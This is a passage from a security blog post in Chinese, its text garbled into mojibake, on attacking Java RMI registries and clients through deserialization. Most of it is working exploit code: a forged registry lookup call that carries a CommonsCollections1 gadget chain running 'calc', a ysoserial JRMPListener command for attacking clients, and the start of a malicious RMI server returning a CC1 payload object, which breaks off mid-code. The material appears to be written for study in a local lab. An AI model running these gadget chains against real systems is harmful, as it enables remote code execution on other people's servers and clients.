constructor.newInstance(Target.class, transformedMap);  <br>        <span class="hljs-keyword">return</span> o;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆå¯¼å…¥ commons-collections 3.2.1</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>éœ€è¦æ³¨æ„ï¼ŒæœåŠ¡ç«¯å’Œæ”»å‡»ç«¯çš„é¡¹ç›®åº”ä¸€è‡´â€”â€”éƒ½æ˜¯ maven ï¼Œå¦åˆ™æ”»å‡»æ— æ•ˆï¼›å¦‚æœä¸åœ¨ä¸€ä¸ªé¡¹ç›®ï¼Œéƒ½è¦æ·»åŠ  commons-collections ä¾èµ–ã€‚</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250809034.png"></p><p>rebind  å’Œ bind ä¸€æ ·ï¼Œä¸å†èµ˜è¿°ã€‚</p><h4 id="4-1-2-lookup-unbind"><a href="#4-1-2-lookup-unbind" class="headerlink" title="4.1.2 lookup&amp;unbind"></a>4.1.2 lookup&amp;unbind</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>String var98;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    <span class="hljs-comment">//è¯»å–è¾“å…¥æµä¼ æ¥çš„ var98 å¹¶ååºåˆ—åŒ–ï¼Œè¿™é‡Œå¯¹åº”çš„åº”è¯¥æ˜¯ lookup å‚æ•°</span><br>    var98 = (String)var104.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br><span class="hljs-comment">//è¿™é‡Œè°ƒç”¨æ³¨å†Œè¡¨æŸ¥æ‰¾å¯¹è±¡ï¼Œè¿”å› Remote ç±»å‹å¹¶æ”¾åœ¨ var101</span><br><span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var9.writeObject(var101);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103446.png"></p><p>lookup åªèƒ½ä¼ å…¥ä¸€ä¸ª String ç±»å‹</p><p>åˆ†æ lookup çš„åŠŸèƒ½ï¼Œç„¶åä¼ªé€  lookup ä»£ç ï¼Œè¾¾åˆ°ç›®çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">lookup</span><span class="hljs-params">(String var1)</span> <span class="hljs-keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//newCll æ„é€ è¿œç¨‹è°ƒç”¨å¯¹è±¡</span><br>            <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//åºåˆ—åŒ–lookup ä¼ å…¥çš„è¾“å…¥æµ</span><br>                <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>                var3.writeObject(var1);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>            &#125;<br><br>            <span class="hljs-comment">//æŠŠä¸Šé¢åºåˆ—åŒ–åçš„è°ƒç”¨çœŸæ­£å‘å¾€è¿œç«¯ã€æ‰§è¡Œè¿œç«¯æ–¹æ³•ã€‚æ­¤å¤„æ˜¯æŠŠ lookup(var1) è¯·æ±‚å‘é€åˆ° RMI æœåŠ¡å™¨ç«¯å¹¶ç­‰å¾…å“åº”ã€‚</span><br>            <span class="hljs-built_in">super</span>.ref.invoke(var2);<br><br>            Remote var23;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                var23 = (Remote)var6.readObject();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-built_in">super</span>.ref.done(var2);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> var23;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103011.png"></p><p>è°ƒç”¨ invoke åå°±åˆ°äº†å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒçš„æµç¨‹ï¼š<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103562.png"></p><h5 id="EXPï¼š-1"><a href="#EXPï¼š-1" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h5><p>åœ¨ bind çš„åŸºç¡€ä¸Šä¿®æ”¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.attack;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.Operation;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteCall;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteObject;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRegistryEXP02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//é€šè¿‡åå°„æ‹¿åˆ° UnicastRef</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.rmi.server.RemoteObject&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;ref&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> (UnicastRef) field.get(registry);<br><br>        <span class="hljs-comment">//ä»è¿™é‡Œå¼€å§‹æ¨¡æ‹Ÿ lookup çš„æ–¹å¼è¿›è¡Œä¼ªé€ æ–¹æ³•è°ƒç”¨</span><br>        <span class="hljs-comment">//è¿™é‡Œæ‰‹åŠ¨æ„å»ºäº†ä¸€æ¬¡ Registry è¿œç¨‹è°ƒç”¨</span><br>        Operation[] operations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br>        <span class="hljs-comment">//è·å–è°ƒç”¨çš„è¾“å‡ºæµ</span><br>        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>        <span class="hljs-comment">//åºåˆ—åŒ–</span><br>        var3.writeObject(CC1());<br>        <span class="hljs-comment">//è¿™é‡Œæ‰§è¡Œè¿œç¨‹è°ƒç”¨è§¦å‘æ¼æ´</span><br>        ref.invoke(var2);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">CC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103340.png"></p><h3 id="4-2-æ”»å‡»å®¢æˆ·ç«¯"><a href="#4-2-æ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="4.2 æ”»å‡»å®¢æˆ·ç«¯"></a>4.2 æ”»å‡»å®¢æˆ·ç«¯</h3><h4 id="4-2-1-æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯"><a href="#4-2-1-æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="4.2.1 æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯"></a>4.2.1 æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯</h4><blockquote><p>é™¤äº† unbind å’Œ rebind éƒ½ä¼šè¿”å›æ•°æ®ç»™å®¢æˆ·ç«¯ï¼Œè¿”å›çš„æ•°æ®æ˜¯åºåˆ—åŒ–å½¢å¼ï¼Œé‚£ä¹ˆåˆ°äº†å®¢æˆ·ç«¯å°±ä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶æ³¨å†Œä¸­å¿ƒçš„è¿”å›æ•°æ®ï¼Œé‚£ä¹ˆå°±èƒ½å®ç°å¯¹å®¢æˆ·ç«¯çš„æ”»å‡»ï¼Œè¿™é‡Œä½¿ç”¨ysoserial çš„ JRMPListenerï¼Œå› ä¸º EXP å®åœ¨å¤ªé•¿äº†ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103591.png"></p><p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 &#39;calc&#39;</code></p><p>å®¢æˆ·ç«¯å»è®¿é—®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        registry.list();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿è¡Œå®Œä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿã€‚ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104922.png"></p><h5 id="åç»­å‘ç°ä¿©ä¸ªé—®é¢˜ï¼Œ"><a href="#åç»­å‘ç°ä¿©ä¸ªé—®é¢˜ï¼Œ" class="headerlink" title="åç»­å‘ç°ä¿©ä¸ªé—®é¢˜ï¼Œ"></a>åç»­å‘ç°ä¿©ä¸ªé—®é¢˜ï¼Œ</h5><h6 id="ä¸€æ˜¯-Java-ç‰ˆæœ¬"><a href="#ä¸€æ˜¯-Java-ç‰ˆæœ¬" class="headerlink" title="ä¸€æ˜¯ Java ç‰ˆæœ¬"></a>ä¸€æ˜¯ Java ç‰ˆæœ¬</h6><p>å¦‚æœæ˜¯ç”¨CC1é“¾ï¼ŒJavaç‰ˆæœ¬ä½äº 1.8.0_65</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104627.png"></p><p>å½“ç„¶ï¼Œé«˜ç‰ˆæœ¬å¯ä»¥ç”¨ CC6 é“¾ç»•è¿‡ä¹Ÿæ˜¯å¯ä»¥çš„</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104501.png"></p><h6 id="äºŒæ˜¯è¿è¡Œè®¡ç®—å™¨æ—¶å› ä¸ºåŠ äº†-å•å¼•å·-â€˜â€™-è€Œæ‰¾ä¸åˆ°ç¨‹åº"><a href="#äºŒæ˜¯è¿è¡Œè®¡ç®—å™¨æ—¶å› ä¸ºåŠ äº†-å•å¼•å·-â€˜â€™-è€Œæ‰¾ä¸åˆ°ç¨‹åº" class="headerlink" title="äºŒæ˜¯è¿è¡Œè®¡ç®—å™¨æ—¶å› ä¸ºåŠ äº† å•å¼•å· â€˜â€™ è€Œæ‰¾ä¸åˆ°ç¨‹åº"></a>äºŒæ˜¯è¿è¡Œè®¡ç®—å™¨æ—¶å› ä¸ºåŠ äº† å•å¼•å· â€˜â€™ è€Œæ‰¾ä¸åˆ°ç¨‹åº</h6><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104209.png"></p><p>è¿è¡Œ <code>calc</code> <code>&quot;calc&quot;</code> éƒ½å¯ä»¥æ­£å¸¸å¼¹å‡º</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104888.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104542.png"></p><p><strong>æ ¹æ® AI çš„è§£é‡Šï¼šåœ¨Windowsç³»ç»Ÿä¸­ï¼Œcmd å‘½ä»¤è¡Œå‚æ•°çš„å•å¼•å·ä¸ä¼šè¢«è‡ªåŠ¨å»é™¤ï¼Œè€Œæ˜¯ä½œä¸ºå‚æ•°çš„ä¸€éƒ¨åˆ†ä¼ é€’ã€‚å½“ysoserialå°è¯•æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå®ƒæ¥æ”¶åˆ°çš„æ˜¯å¸¦å•å¼•å·çš„ <code>&#39;calc&#39;</code>ï¼Œè€Œä¸æ˜¯å•çº¯çš„ <code>calc</code>ã€‚å½“æˆ‘ä»¬æ¢æˆ power shell æ—¶ï¼Œæ˜¯å¯ä»¥æ­£ç¡®æ‰§è¡Œçš„ã€‚</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251941223.png" alt="img"></p><h4 id="4-2-2-æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯"><a href="#4-2-2-æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="4.2.2 æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯"></a>4.2.2 æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯</h4><p>æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯ï¼Œå¯åˆ†ä¿©ç§æƒ…å½¢ï¼š</p><ol><li><font style="color:rgb(80, 80, 92);">æœåŠ¡ç«¯è¿”å›Objectå¯¹è±¡</font></li><li><font style="color:rgb(80, 80, 92);">è¿œç¨‹åŠ è½½å¯¹è±¡</font></li></ol><h5 id="æœåŠ¡ç«¯è¿”å›Objectå¯¹è±¡"><a href="#æœåŠ¡ç«¯è¿”å›Objectå¯¹è±¡" class="headerlink" title="æœåŠ¡ç«¯è¿”å›Objectå¯¹è±¡"></a><font style="color:rgb(80, 80, 92);">æœåŠ¡ç«¯è¿”å›Objectå¯¹è±¡</font></h5><p>RMI è¿œç¨‹æ–¹æ³•è°ƒç”¨è¿”å›çš„ä¸ä¸€å®šæ˜¯ä¸€ä¸ªåŸºç¡€æ•°æ®ç±»å‹ï¼ˆæ¯”å¦‚String  intï¼‰ï¼Œä¹Ÿä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚æœåŠ¡ç«¯è¿”å›ç»™å®¢æˆ·ç«¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®¢æˆ·ç«¯è¦å¯¹è¿™ä¸ªå¯¹è±¡ååºåˆ—åŒ–ã€‚æ‰€ä»¥æˆ‘ä»¬ä¼ªé€ ä¸€ä¸ªæœåŠ¡ç«¯ï¼Œå½“å®¢æˆ·ç«¯è°ƒç”¨æŸä¸ªæ–¹æ³•æ—¶ï¼Œè¿”å›çš„å°±æ˜¯æ¶æ„å¯¹è±¡ï¼Œå°±å¯ä»¥æ”»å‡»å®¢æˆ·ç«¯ã€‚</p><p>User æ¥å£ï¼Œè¿”å› Object å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">java</span>.rmi.Remote &#123;<br>    Object <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœåŠ¡ç«¯å®ç° User æ¥å£ï¼Œè¿”å› CC1 æ¶æ„ Object å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServerReturnObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">User</span>  &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServerReturnObject</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span 